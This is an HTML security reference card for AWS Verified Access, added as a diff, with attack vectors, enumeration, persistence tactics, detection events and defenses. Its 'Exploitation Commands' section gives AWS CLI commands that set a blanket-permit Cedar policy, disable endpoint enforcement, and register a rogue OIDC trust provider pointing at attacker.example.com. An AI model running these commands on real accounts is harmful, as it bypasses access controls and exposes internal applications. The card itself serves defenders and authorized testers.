@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Verified Access Security | AWS Security Cards</title>
+<meta name="description" content="AWS Verified Access provides secure access to corporate applications without requiring a VPN, evaluating each access request against Cedar policies.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #3b82f615, #0a0e1a, #0ea5e915);
+    border: 1px solid #3b82f64d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #3b82f60d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #3b82f633;
+    color: #3b82f6;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #3b82f64d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/verifiedaccess-card.webp" alt="AWS Verified Access Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/verifiedaccess.svg" alt="AWS Verified Access Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Verified Access Security</span>
+        <span class="header-badge">NETWORKING</span>
+      </div>
+      <p class="header-desc">AWS Verified Access provides secure access to corporate applications without requiring a VPN. It evaluates each access request in real time against Cedar policies using identity and device posture data from configured trust providers. Compromising it means bypassing zero-trust enforcement entirely.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f59e0b;">MEDIUM</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">Regional</div>
+          <div class="stat-label">Scope</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">Cedar</div>
+          <div class="stat-label">Policy Language</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">RBAC + ABAC</div>
+          <div class="stat-label">Auth Model</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#3b82f6;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #3b82f6;">Core Components</h4>
+          <p>Verified Access Instance (top-level resource), Trust Providers (identity + device posture), Groups (collections of endpoints sharing a policy), and Endpoints (individual applications). Uses Cedar policy language.</p>
+          <div class="attack-note"><span style="color:#3b82f6;">Attack note:</span> An attacker who can modify group or endpoint policies, or attach a trust provider they control, can grant themselves access to every protected application.</div>
+        </div>
+        <div>
+          <h4 style="color: #3b82f6;">Cedar Policies and Trust Providers</h4>
+          <p>Cedar policies default to implicit deny. Group-level policies are inherited by all endpoints. One identity trust provider (IAM Identity Center or OIDC) and multiple device trust providers (CrowdStrike, Jamf, JumpCloud) per instance.</p>
+          <div class="attack-note"><span style="color:#3b82f6;">Attack note:</span> An overly broad permit statement at the group level with no endpoint-level restrictions grants access to all endpoints in that group.</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 65%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">6.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Verified Access is a protective control, not a data store. The primary risk is misconfiguration that weakens or bypasses access enforcement. Compromise of the trust provider or overly permissive Cedar policies can expose all protected applications.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">&#x2694;&#xFE0F; Attack Vectors</h3><h4 style="color: #f87171;">Trust Provider Abuse</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Compromise OIDC identity provider to issue valid tokens</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Register a rogue device trust provider</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exploit misconfigured OIDC scopes or claims</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Steal or replay user session tokens</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Target IdP admin console to add attacker users</li></ul><h4 style="color: #f87171;">Policy &amp; Config Manipulation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify group policy to blanket permit statement</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Disable policy on endpoint (--no-policy-enabled)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Create new endpoint in permissive group</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Attach attacker-controlled trust provider</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Delete endpoint to force less secure fallback</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">&#x26A0;&#xFE0F; Misconfigurations</h3><h4 style="color: #fb923c;">Policy Weaknesses</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Group policy uses permit(principal, action, resource) with no conditions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Endpoint policy not enabled (PolicyEnabled: false)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Cedar policy checks identity but ignores device posture</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Policy references nonexistent trust provider context key</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No endpoint-level policy refinement</li></ul><h4 style="color: #fb923c;">Operational Gaps</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Access logging not enabled on instance</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Trust provider not validated (misconfigured OIDC URL)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No device trust provider attached</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Instance has no tags or naming convention</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Endpoints exposed to broader network than intended</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">&#x1F50D; Enumeration</h3><div class="cmd-block">
+          <div class="cmd-title">List Verified Access Instances</div>
+          <pre><code>aws ec2 describe-verified-access-instances</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Trust Providers</div>
+          <pre><code>aws ec2 describe-verified-access-trust-providers</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Verified Access Groups</div>
+          <pre><code>aws ec2 describe-verified-access-groups</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Get Group Policy (Cedar)</div>
+          <pre><code>aws ec2 get-verified-access-group-policy \
+  --verified-access-group-id vagr-0dbe967baf14b7235</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Check Logging Configuration</div>
+          <pre><code>aws ec2 describe-verified-access-instance-logging-configurations \
+  --verified-access-instance-ids vai-0ce000c0b7643abea</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">&#x1F4C8; Privilege Escalation</h3><h4 style="color: #c084fc;">Policy Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> ModifyVerifiedAccessGroupPolicy to blanket permit</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> ModifyVerifiedAccessEndpointPolicy to disable enforcement</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> CreateVerifiedAccessEndpoint for sensitive internal resources</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> AttachVerifiedAccessTrustProvider (attacker-controlled)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> CreateVerifiedAccessTrustProvider with rogue OIDC issuer</li></ul><div class="note"><strong>Key insight:</strong> Verified Access itself is not a path to IAM privilege escalation. However, modifying policies grants access to all protected internal applications.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">&#x1F517; Persistence</h3><h4 style="color: #facc15;">Access Bypass</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Replace Cedar group policy with blanket permit</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Disable endpoint-level policy enforcement</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Attach attacker-controlled trust provider</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create endpoints in permissive groups</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify instance descriptions to obscure audit trail</li></ul><h4 style="color: #facc15;">Maintaining Access</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Generate fabricated device posture data</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exploit OIDC token issuance from compromised IdP</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create new endpoints pointing to internal resources</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Keep access logging disabled</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify trust provider to accept broader claims</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">&#x1F6E1;&#xFE0F; Detection</h3><h4 style="color: #4ade80;">High-Impact CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ModifyVerifiedAccessGroupPolicy - policy changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ModifyVerifiedAccessEndpointPolicy - endpoint policy changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateVerifiedAccessTrustProvider - new trust provider</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> AttachVerifiedAccessTrustProvider - provider attached</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteVerifiedAccessEndpoint - endpoint removed</li></ul><h4 style="color: #4ade80;">Access Log Indicators</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Access from unexpected IP addresses</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Failed policy evaluations from new principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Successful access without device posture context</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Bulk endpoint creation or modification</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Trust provider configuration changes</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid"><div class="cmd-block">
+          <div class="cmd-title">Replace Group Policy with Blanket Permit</div>
+          <pre><code>aws ec2 modify-verified-access-group-policy \
+  --verified-access-group-id vagr-XXXXX \
+  --policy-enabled \
+  --policy-document &quot;permit(principal, action, resource);&quot;</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Disable Endpoint Policy</div>
+          <pre><code>aws ec2 modify-verified-access-endpoint-policy \
+  --verified-access-endpoint-id vae-XXXXX \
+  --no-policy-enabled</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Create Rogue Trust Provider</div>
+          <pre><code>aws ec2 create-verified-access-trust-provider \
+  --trust-provider-type user \
+  --user-trust-provider-type oidc \
+  --oidc-options Issuer=https://attacker.example.com,AuthorizationEndpoint=...,TokenEndpoint=...</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Attach Trust Provider to Instance</div>
+          <pre><code>aws ec2 attach-verified-access-trust-provider \
+  --verified-access-instance-id vai-XXXXX \
+  --verified-access-trust-provider-id vatp-XXXXX</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid"><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Unrestricted Policy Modification</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;ec2:ModifyVerifiedAccessGroupPolicy&quot;,
+    &quot;ec2:ModifyVerifiedAccessEndpointPolicy&quot;,
+    &quot;ec2:CreateVerifiedAccessTrustProvider&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Grants unrestricted ability to rewrite Cedar policies and attach arbitrary trust providers</p>
+        </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Read-Only Auditor</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;ec2:DescribeVerifiedAccessInstances&quot;,
+    &quot;ec2:DescribeVerifiedAccessGroups&quot;,
+    &quot;ec2:DescribeVerifiedAccessEndpoints&quot;,
+    &quot;ec2:GetVerifiedAccessGroupPolicy&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Permits enumeration and policy review without ability to modify access controls</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid"><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F4DD;</span>
+            <div>
+              <h4>Enable Access Logging on Every Instance</h4>
+              <p>Send Verified Access logs to CloudWatch Logs, S3, or Kinesis Data Firehose for audit.</p>
+              <pre><code>aws ec2 modify-verified-access-instance-logging-configuration \
+  --verified-access-instance-id vai-XXXXX \
+  --access-logs S3={Enabled=true,BucketName=my-va-logs-bucket}</code></pre>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F4F1;</span>
+            <div>
+              <h4>Attach Both Identity and Device Trust Providers</h4>
+              <p>Never rely on identity alone. Attach at least one device trust provider (CrowdStrike, Jamf, JumpCloud) for device posture checks.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F4DC;</span>
+            <div>
+              <h4>Write Restrictive Cedar Policies</h4>
+              <p>Use group-level policies for broad requirements and endpoint-level policies for application-specific conditions.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F512;</span>
+            <div>
+              <h4>Restrict IAM Permissions for Modification</h4>
+              <p>Limit ec2:ModifyVerifiedAccess*, ec2:CreateVerifiedAccess*, and ec2:AttachVerifiedAccessTrustProvider to administrators.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F50D;</span>
+            <div>
+              <h4>Monitor CloudTrail for Policy Changes</h4>
+              <p>Alert on ModifyVerifiedAccessGroupPolicy, CreateVerifiedAccessTrustProvider, and DeleteVerifiedAccessEndpoint.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x2705;</span>
+            <div>
+              <h4>Validate Trust Provider Configuration</h4>
+              <p>Audit OIDC issuer URL, client ID, and scopes on identity trust providers regularly.</p>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Verified Access Security Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
